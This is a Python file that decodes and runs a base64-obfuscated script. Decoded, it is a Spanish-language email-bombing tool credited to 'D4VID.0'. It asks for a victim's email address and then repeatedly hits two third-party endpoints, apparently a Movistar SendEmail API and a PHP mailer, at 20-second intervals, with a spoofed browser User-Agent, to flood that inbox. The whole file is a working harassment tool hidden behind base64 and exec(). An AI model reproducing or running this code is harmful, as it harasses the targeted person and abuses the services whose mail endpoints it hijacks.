import base64
script = b"""
aW1wb3J0IHJlcXVlc3RzDQppbXBvcnQgYmFzZTY0DQppbXBvcnQgdGltZQ0KZnJvbSByZXF1ZXN0
cy5zdHJ1Y3R1cmVzIGltcG9ydCBDYXNlSW5zZW5zaXRpdmVEaWN0DQpmcm9tIHN5cyBpbXBvcnQg
ZXhpdA0KZnJvbSBjb2xvcmFtYSBpbXBvcnQgRm9yZSxpbml0DQppbml0KCkNCm9fdmVyZGUgPSBG
b3JlLkdSRUVOIA0Kcm9qbyA9IEZvcmUuTElHSFRSRURfRVgNCnZlcmRlID0gRm9yZS5MSUdIVEdS
RUVOX0VYDQpjeWFuID0gRm9yZS5MSUdIVENZQU5fRVgNCmJsYW5jbyA9IEZvcmUuTElHSFRXSElU
RV9FWA0KbWFnZW50YSA9IEZvcmUuTElHSFRNQUdFTlRBX0VYDQojIHZlcmlmaWNhciBjb25leGnD
s24gYSBpbnRlcm5ldA0KdHJ5Og0KICAgIHJlcXVlc3QgPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8v
d3d3Lmdvb2dsZS5jb20iLCB0aW1lb3V0PTUpDQpleGNlcHQgKHJlcXVlc3RzLkNvbm5lY3Rpb25F
cnJvciwgcmVxdWVzdHMuVGltZW91dCk6DQogICAgcHJpbnQoZiJ7cm9qb31be2JsYW5jb30qe3Jv
am99XSB7YmxhbmNvfU5FQ0VTSVRBUyBVTkEgQ09ORVhJw5NOIEVTVEFCTEUgQSBJTlRFUk5FVFxu
WypdIElOVEVOVEFMTyBNw4FTIFRBUkRFLiIpDQogICAgZXhpdCgpDQplbHNlOg0KICAgIHBhc3MN
CiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIw0KIyBQT1JRVUUgQ0hVQ0hBIEVTVEFTIFRBTiBJTlRF
UkVTQURPIEVOIEVMIEPDk0RJR08gREUgTEEgSEVSUkFNSUVOVEEgPyAgICAgICAgICAgIw0KIyBU
RSBESVNURSBFTCBUUkFCQUpPIERFIERFQ09ESUZJQ0FSIExBIFRPT0wgUVVFIEVTVEFCQSBFTiBC
QVNFNjQgICAgICAgICAgICAgICAjDQojIEhVTUlMREFEIFBPUkZBVk9SUlJSUlIgICAgICAgICAg
ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMNCiMgREVKQSBN
RVJJVE9TIEFMTUVOT1MsIFVOIERJQSBBTlRFUyBERSBDUkVBUiBMQSBUT09MIE1JIE5PVklBIE1F
IERFSsOTIFhEICAgICAgICMNCiMgQlVFTk8gWUEgVkUgTUlSQSBFTCBDw5NESUdPLCBNRSBWQUxF
LiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICMNCiMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyANCiMgbG9nbyBkZSBsYSBoZXJyYW1pZW50YS4NCnByaW50KGYiIiINCntv
X3ZlcmRlfSAgwrfiloTiloTiloTiloTigKIgICAgICDigKIg4paMIOKWhCDCty4g4paE4paE4paE
4paEwrcg4paqICDiloTiloTiloQgLg0Ke29fdmVyZGV9ICDilqriloDCty7ilojilozilqogICAg
IMK34paI4paIIOKWkOKWiOKWiOKWiOKWquKWkOKWiCDiloDilojilqrilojilogg4paA4paELuKW
gMK3ICANCntvX3ZlcmRlfSAg4paE4paI4paA4paA4paA4oCiIOKWhOKWiOKWgOKWhCDilpDilogg
4paM4paQ4paM4paQ4paIwrfilpDilojiloDiloDilojiloTilpDilojCt+KWkOKWgOKWgOKWquKW
hA0Ke29fdmVyZGV9ICDilojilozilqriloTilojiloDilpDilojilowu4paQ4paM4paI4paIIOKW
iOKWiOKWjOKWkOKWiOKWjOKWiOKWiOKWhOKWquKWkOKWiOKWkOKWiOKWjOKWkOKWiOKWhOKWhOKW
jA0Ke29fdmVyZGV9ICDCt+KWgOKWgOKWgCDigKIg4paA4paI4paE4paA4paq4paA4paAICDiloji
lqriloDiloDiloDCt+KWgOKWgOKWgOKWgCDiloDiloDiloAg4paA4paA4paAICB7b192ZXJkZX1C
RVRBDQp7Y3lhbn0gICAgICAgICAgICAgICAgIEQ0VklELjANCntibGFuY299ICAgICAgICAgSW5z
dGFncmFtIDogZDR2aWQuMGRheSANCnttYWdlbnRhfVs9PT09PT09PT09PT09PT09PT09PT09PT09
PT09PT09PT09PT09PT09PT09XXtibGFuY299DQoiIiIpDQptZXNzYWdlID0gaW5wdXQoIls+XSBF
c2NyaWJlIGVsIGNvcnJlbyBhIHNwYW1lYXI6ICIpDQoNCmRlZiBjb3JyZW9fbW92aXN0YXJfMSgp
Og0KICAgIG1lc3NhZ2VfYnl0ZXMgPSBtZXNzYWdlLmVuY29kZSgnYXNjaWknKQ0KICAgIGJhc2U2
NF9ieXRlcyA9IGJhc2U2NC5iNjRlbmNvZGUobWVzc2FnZV9ieXRlcykNCiAgICBiYXNlNjRfbWFp
bCA9IGJhc2U2NF9ieXRlcy5kZWNvZGUoJ2FzY2lpJykNCiAgICB1cmwgPSAiaHR0cHM6Ly9mbi1p
ZGVudGl0eS1wcmQuYXp1cmVmZC5uZXQvYXBpL1NlbmRFbWFpbD9jb2RlPXJSb2dXajRSaTZBSU1I
WjBiWjUycTk3d1pPb1ozRjNSbFd3aG4vdm5qVGd4bFpld0xVdDIzZz09Ig0KICAgIGhlYWRlcnMg
PSBDYXNlSW5zZW5zaXRpdmVEaWN0KCkNCiAgICBoZWFkZXJzWyJDb250ZW50LVR5cGUiXSA9ICJh
cHBsaWNhdGlvbi9qc29uIg0KICAgIGhlYWRlcnNbIlVzZXItQWdlbnQiXSA9ICJNb3ppbGxhLzUu
MCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBBcHBsZVdlYktpdC81MzcuMzYgKEtIVE1M
LCBsaWtlIEdlY2tvKSBDaHJvbWUvNzAuMC4zNTM4LjEwMiBTYWZhcmkvNTM3LjM2IEVkZ2UvMTgu
MTgzNjIiDQogICAgZGF0YSA9IHsNCiAgICAgICJlbWFpbCI6YmFzZTY0X21haWwsDQogICAgICAi
dHlwZSI6MSwNCiAgICAgICJzdWJqZWN0IjoiIiwNCiAgICAgICJuYW1lIjoiIiwNCiAgICAgICJ0
eHRNc2ciOiIiDQogICAgfQ0KICAgIHJlc3AgPSByZXF1ZXN0cy5wb3N0KHVybCwgaGVhZGVycz1o
ZWFkZXJzLCBqc29uPWRhdGEpDQogICAgcmVzMSA9IHJlc3AudGV4dA0KICAgIGlmICJzdWNjZXNz
IiBpbiByZXMxOg0KICAgICAgICBwcmludChmInt2ZXJkZX1be2JsYW5jb30re3ZlcmRlfV0ge2N5
YW59TUVOU0FKRSBFTlZJQURPIikNCiAgICBlbHNlOg0KICAgICAgICBwcmludChmIntyb2pvfVt7
YmxhbmNvfSt7cm9qb31dIHtibGFuY299Tk8gU0UgUFVETyBFTlZJQVIgRUwgTUVOU0FKRSIpDQoN
CmRlZiBjb3JyZW9fbW92aXN0YXJfMigpOg0KICAgIG1lc3NhZ2VfYnl0ZXMgPSBtZXNzYWdlLmVu
Y29kZSgnYXNjaWknKQ0KICAgIGJhc2U2NF9ieXRlcyA9IGJhc2U2NC5iNjRlbmNvZGUobWVzc2Fn
ZV9ieXRlcykNCiAgICBiYXNlNjRfbWFpbCA9IGJhc2U2NF9ieXRlcy5kZWNvZGUoJ2FzY2lpJykN
CiAgICB1cmwgPSAiaHR0cHM6Ly9mbi1pZGVudGl0eS1wcmQuYXp1cmVmZC5uZXQvYXBpL1NlbmRF
bWFpbD9jb2RlPXJSb2dXajRSaTZBSU1IWjBiWjUycTk3d1pPb1ozRjNSbFd3aG4vdm5qVGd4bFpl
d0xVdDIzZz09Ig0KICAgIGhlYWRlcnMgPSBDYXNlSW5zZW5zaXRpdmVEaWN0KCkNCiAgICBoZWFk
ZXJzWyJDb250ZW50LVR5cGUiXSA9ICJhcHBsaWNhdGlvbi9qc29uIg0KICAgIGhlYWRlcnNbIlVz
ZXItQWdlbnQiXSA9ICJNb3ppbGxhLzUuMCAoV2luZG93cyBOVCAxMC4wOyBXaW42NDsgeDY0KSBB
cHBsZVdlYktpdC81MzcuMzYgKEtIVE1MLCBsaWtlIEdlY2tvKSBDaHJvbWUvNzAuMC4zNTM4LjEw
MiBTYWZhcmkvNTM3LjM2IEVkZ2UvMTguMTgzNjIiDQogICAgZGF0YSA9IHsNCiAgICAgICJlbWFp
bCI6YmFzZTY0X21haWwsDQogICAgICAidHlwZSI6MiwNCiAgICAgICJzdWJqZWN0IjoiIiwNCiAg
ICAgICJuYW1lIjoiIiwNCiAgICAgICJ0eHRNc2ciOiIiDQogICAgfQ0KICAgIHJlc3AgPSByZXF1
ZXN0cy5wb3N0KHVybCwgaGVhZGVycz1oZWFkZXJzLCBqc29uPWRhdGEpDQogICAgcmVzID0gcmVz
cC50ZXh0DQogICAgaWYgInN1Y2Nlc3MiIGluIHJlczoNCiAgICAgICAgcHJpbnQoZiJ7dmVyZGV9
W3tibGFuY299K3t2ZXJkZX1dIHtjeWFufU1FTlNBSkUgRU5WSUFETyIpDQogICAgZWxzZToNCiAg
ICAgICAgcHJpbnQoZiJ7cm9qb31be2JsYW5jb30re3Jvam99XSB7YmxhbmNvfU5PIFNFIFBVRE8g
RU5WSUFSIEVMIE1FTlNBSkUiKQ0KDQpkZWYgY29ycmVvX3ZmcCgpOg0KICAgIGhlYWRlcnMgPSBD
YXNlSW5zZW5zaXRpdmVEaWN0KCkNCiAgICBoZWFkZXJzWyJVc2VyLUFnZW50Il0gPSAiTW96aWxs
YS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChL
SFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzcwLjAuMzUzOC4xMDIgU2FmYXJpLzUzNy4zNiBFZGdl
LzE4LjE4MzYyIg0KICAgIHVybF92ZnAgPSBmIiBodHRwOi8vd3d3LnZmcHN0ZWFtYmkuc29sdXRp
b25zL3ZmcHNtYWlsL3ZmcHNtYWlsLnBocD9jb3JyZW89e21lc3NhZ2V9JmlkcmVnPTk1NzkiDQog
ICAgZW52ID0gcmVxdWVzdHMuZ2V0KHVybF92ZnApDQogICAgcnB0YSA9IGVudi50ZXh0DQogICAg
aWYgIk9LIiBpbiBycHRhOg0KICAgICAgICBwcmludChmInt2ZXJkZX1be2JsYW5jb30re3ZlcmRl
fV0ge2N5YW59TUVOU0FKRSBFTlZJQURPIikNCiAgICBlbHNlOg0KICAgICAgICBwcmludChmInty
b2pvfVt7YmxhbmNvfSt7cm9qb31dIHtibGFuY299Tk8gU0UgUFVETyBFTlZJQVIgRUwgTUVOU0FK
RSIpDQoNCmRlZiBlbnZpb19zcGFtKCk6DQogICAgY29ycmVvX21vdmlzdGFyXzEoKSAgIA0KICAg
IHByaW50KGYiXG57bWFnZW50YX1be2N5YW59I3ttYWdlbnRhfV0ge29fdmVyZGV9VElFTVBPIERF
IEVTUEVSQSBERSBTT0xJQ0lUVUQgMjBzIDpEXG4iKSAjdGllbXBvIGRlIGVzcGVyYQ0KICAgIHRp
bWUuc2xlZXAoMjApDQogICAgY29ycmVvX3ZmcCgpDQogICAgcHJpbnQoZiJcbnttYWdlbnRhfVt7
Y3lhbn0je21hZ2VudGF9XSB7b192ZXJkZX1USUVNUE8gREUgRVNQRVJBIERFIFNPTElDSVRVRCAy
MHMgOkRcbiIpICN0aWVtcG8gZGUgZXNwZXJhDQogICAgdGltZS5zbGVlcCgyMCkNCiAgICBjb3Jy
ZW9fbW92aXN0YXJfMigpDQogICAgcHJpbnQoZiJcbnttYWdlbnRhfVt7Y3lhbn0je21hZ2VudGF9
XSB7b192ZXJkZX1USUVNUE8gREUgRVNQRVJBIERFIFNPTElDSVRVRCAyMHMgOkRcbiIpICN0aWVt
cG8gZGUgZXNwZXJhDQogICAgdGltZS5zbGVlcCgyMCkNCiAgICBjb3JyZW9fbW92aXN0YXJfMSgp
DQogICAgcHJpbnQoZiJcbnttYWdlbnRhfVt7Y3lhbn0je21hZ2VudGF9XSB7b192ZXJkZX1USUVN
UE8gREUgRVNQRVJBIERFIFNPTElDSVRVRCAyMHMgOkRcbiIpICN0aWVtcG8gZGUgZXNwZXJhDQog
ICAgdGltZS5zbGVlcCgyMCkNCiAgICBjb3JyZW9fdmZwKCkNCiAgICBwcmludChmIlxue21hZ2Vu
dGF9W3tjeWFufSN7bWFnZW50YX1dIHtvX3ZlcmRlfVRJRU1QTyBERSBFU1BFUkEgREUgU09MSUNJ
VFVEIDIwcyA6RFxuIikgI3RpZW1wbyBkZSBlc3BlcmENCiAgICB0aW1lLnNsZWVwKDIwKQ0KICAg
IGNvcnJlb19tb3Zpc3Rhcl8yKCkNCiAgICBwcmludChmIlxue21hZ2VudGF9W3tjeWFufSN7bWFn
ZW50YX1dIHtvX3ZlcmRlfVRJRU1QTyBERSBFU1BFUkEgREUgU09MSUNJVFVEIDIwcyA6RFxuIikg
I3RpZW1wbyBkZSBlc3BlcmENCiAgICB0aW1lLnNsZWVwKDIwKQ0KICAgIGNvcnJlb19tb3Zpc3Rh
cl8xKCkNCiAgICBwcmludChmIlxue21hZ2VudGF9W3tjeWFufSN7bWFnZW50YX1dIHtvX3ZlcmRl
fVRJRU1QTyBERSBFU1BFUkEgREUgU09MSUNJVFVEIDIwcyA6RFxuIikgI3RpZW1wbyBkZSBlc3Bl
cmENCiAgICB0aW1lLnNsZWVwKDIwKQ0KICAgIGNvcnJlb192ZnAoKQ0KICAgIHByaW50KGYiXG57
bWFnZW50YX1be2N5YW59I3ttYWdlbnRhfV0ge29fdmVyZGV9VElFTVBPIERFIEVTUEVSQSBERSBT
T0xJQ0lUVUQgMjBzIDpEXG4iKQ0KICAgIHRpbWUuc2xlZXAoMjApDQogICAgY29ycmVvX21vdmlz
dGFyXzIoKQ0KICAgIHByaW50KGYiXG57bWFnZW50YX1be2N5YW59I3ttYWdlbnRhfV0ge29fdmVy
ZGV9VElFTVBPIERFIEVTUEVSQSBERSBTT0xJQ0lUVUQgMjBzIDpEXG4iKQ0KICAgIHRpbWUuc2xl
ZXAoMjApDQogICAgY29ycmVvX21vdmlzdGFyXzEoKQ0KICAgIHByaW50KGYiXG57bWFnZW50YX1b
e2N5YW59I3ttYWdlbnRhfV0ge29fdmVyZGV9VElFTVBPIERFIEVTUEVSQSBERSBTT0xJQ0lUVUQg
MjBzIDpEXG4iKQ0KICAgIHRpbWUuc2xlZXAoMjApDQogICAgY29ycmVvX3ZmcCgpDQogICAgcHJp
bnQoZiJcbnttYWdlbnRhfVt7Y3lhbn0je21hZ2VudGF9XSB7b192ZXJkZX1USUVNUE8gREUgRVNQ
RVJBIERFIFNPTElDSVRVRCAyMHMgOkRcbiIpDQogICAgdGltZS5zbGVlcCgyMCkNCiAgICBjb3Jy
ZW9fbW92aXN0YXJfMigpDQogICAgcHJpbnQoZiJcbnttYWdlbnRhfVt7Y3lhbn0je21hZ2VudGF9
XSB7b192ZXJkZX1USUVNUE8gREUgRVNQRVJBIERFIFNPTElDSVRVRCAyMHMgOkRcbiIpDQogICAg
dGltZS5zbGVlcCgyMCkNCiAgICBjb3JyZW9fbW92aXN0YXJfMSgpDQogICAgcHJpbnQoZiJcbnt2
ZXJkZX1be29fdmVyZGV9JHt2ZXJkZX1dIHtjeWFufUVMIEVOVklPIERFIFNQQU0gUE9SIENPUlJF
TyBBQ0FCQSBERSBGSU5BTElaQVIuIikNCg0KaWYgX19uYW1lX18gPT0gIl9fbWFpbl9fIjoNCiAg
ICB0cnk6DQogICAgICAgIHByaW50KGYie3ZlcmRlfUlOSUNJQU5ETyBFTCBTUEFNIEFMIENPUlJF
TyB7b192ZXJkZX17bWVzc2FnZX0iKQ0KICAgICAgICB0aW1lLnNsZWVwKDUpDQogICAgICAgIGVu
dmlvX3NwYW0oKQ0KDQogICAgZXhjZXB0IEtleWJvYXJkSW50ZXJydXB0Og0KICAgICAgICBwcmlu
dChmIntibGFuY299WyFdIHtvX3ZlcmRlfUVOVklPIERFIFNQQU0gREVURU5JRE8hIikNCiAgICAg
ICAgdGltZS5zbGVlcCgyKQ0KICAgICAgICBwcmludChmIntjeWFufS4uLi4uLi4uLiA6RCIpDQog
ICAgICAgIGV4aXQoKQ==
"""
exec(base64.b64decode(script))

